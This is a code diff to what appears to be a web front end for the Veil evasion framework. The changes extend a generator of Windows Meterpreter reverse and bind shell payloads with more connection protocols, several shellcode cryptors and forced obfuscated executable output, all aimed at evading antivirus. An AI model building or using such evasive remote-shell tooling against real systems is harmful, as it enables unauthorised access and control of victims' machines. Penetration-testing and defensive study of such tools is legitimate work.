@@ -36,8 +36,10 @@ from config import veil
 
 class CreatePayloadHandler(BaseHandler):
 
-    protocols = ['tcp', 'tcp_rc4', 'http', 'https']
-    cryptors = ['AESVirtualAlloc',]
+    reverse_protocols = ['tcp', 'tcp_rc4', 'tcp_allports', 'tcp_dns', 'http', 'https']
+    bind_protocols = ['tcp', 'tcp_rc4', 'ipv6_tcp']
+    cryptors = ['AESVirtualAlloc', 'ARCVirtualAlloc', 'DESVirtualAlloc', 
+                'LetterSubVirtualAlloc', 'b64VirtualAlloc']
 
 
     @authenticated
@@ -72,19 +74,23 @@ class CreatePayloadHandler(BaseHandler):
             # LHOST
             ip = self.get_argument('lhost', None)
             lhost = self.validate_ip_address(ip)
+            if lhost is None:
+                raise ValueError('Invalid listener address')
             # LPORT
             port = self.get_argument('lport', None)
             lport = self.validate_port(port)
             # Protocol
             protocol = self.get_argument('protocol', None)
-            if not protocol in self.protocols:
+            if not protocol in self.reverse_protocols:
                 raise ValueError("Invalid protocol")
             msfpayload += protocol
             # Cryptor
             cryptor = self.get_argument('cryptor', None)
             if not cryptor in self.cryptors:
                 raise ValueError("Invalid cryptor")
-            payload = self.create_payload(lport, msfpayload, protocol, cryptor, lhost)
+            payload = self.create_payload(lport, msfpayload, 
+                protocol, cryptor, lhost=lhost
+            )
             self.generate("reverse_" + protocol, payload)
             self.redirect('/history?uuid=' + payload.uuid)
         except ValueError as error:
@@ -95,12 +101,17 @@ class CreatePayloadHandler(BaseHandler):
         ''' Validate arguments for a bind shell '''
         msfpayload = 'windows/meterpreter/bind_'
         try:
+            # RHOST
+            ip = self.get_argument('rhost', None)
+            rhost = self.validate_ip_address(ip)
+            if rhost is None:
+                raise ValueError('Invalid remote address')
             # LPORT
             port = self.get_argument('lport', None)
             lport = self.validate_port(port)
             # Protocol
             protocol = self.get_argument('protocol', None)
-            if not protocol in self.protocols:
+            if not protocol in self.bind_protocols:
                 raise ValueError("Invalid protocol")
             msfpayload += protocol
             # Cryptor
@@ -108,19 +119,23 @@ class CreatePayloadHandler(BaseHandler):
             if not cryptor in self.cryptors:
                 raise ValueError("Invalid cryptor")
             # Create Payload
-            payload = self.create_payload(lport, msfpayload, protocol, cryptor)
+            payload = self.create_payload(lport, msfpayload, 
+                protocol, cryptor, rhost=rhost
+            )
             self.generate("bind_" + protocol, payload)
             self.redirect('/history?uuid=' + payload.uuid)
         except ValueError as error:
             errors = [str(error)]
             self.render_page('veil/create/bind.html', errors)
 
-    def create_payload(self, lport, msfpayload, protocol, cryptor, lhost="0.0.0.0"):
+    def create_payload(self, lport, msfpayload, protocol, cryptor, 
+                        lhost="0.0.0.0", rhost="0.0.0.0"):
         ''' Save new payload in database '''
         user = self.get_current_user()
         payload = Payload(
             user_id=user.id,
             lhost=lhost,
+            rhost=rhost,
             lport=lport,
             msfpayload=msfpayload,
             protocol=protocol,
@@ -135,6 +150,7 @@ class CreatePayloadHandler(BaseHandler):
         controller = veil_controller.Controller()
         options = {}
         options['msfvenom'] = [payload.msfpayload, payload.msfoptions]
+        options['required_options'] = {'compile_to_exe': 'Y', 'use_pyherion': 'Y'}
         controller.SetPayload(language, payload.cryptor, options)
         file_name = name + "_veil"
         file_path = controller.OutputMenu(
@@ -151,7 +167,8 @@ class CreatePayloadHandler(BaseHandler):
     def render_page(self, html, errors=[]):
         self.render(html, 
             errors=errors, 
-            protocols=self.protocols,
+            bind_protocols=self.bind_protocols,
+            reverse_protocols=self.reverse_protocols,
             cryptors=self.cryptors,
         )
 
@@ -188,7 +205,9 @@ class HistoryHandler(BaseHandler):
             if payload is not None and payload in user.history:
                 self.render('history/view_payload.html', payload=payload)
         else:
-            self.render('history/view_table.html', payloads=user.history)
+            self.render('history/view_table.html', 
+                payloads=user.chronological_history
+            )
 
 
 class DownloadHandler(BaseHandler):
